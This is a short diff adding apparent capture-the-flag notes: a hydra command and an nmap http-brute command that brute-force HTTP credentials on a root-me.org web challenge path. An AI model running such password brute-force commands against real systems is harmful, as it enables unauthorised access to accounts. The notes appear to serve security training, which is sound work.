@@ -1,0 +1,3 @@
+hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/ 
+
+nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org
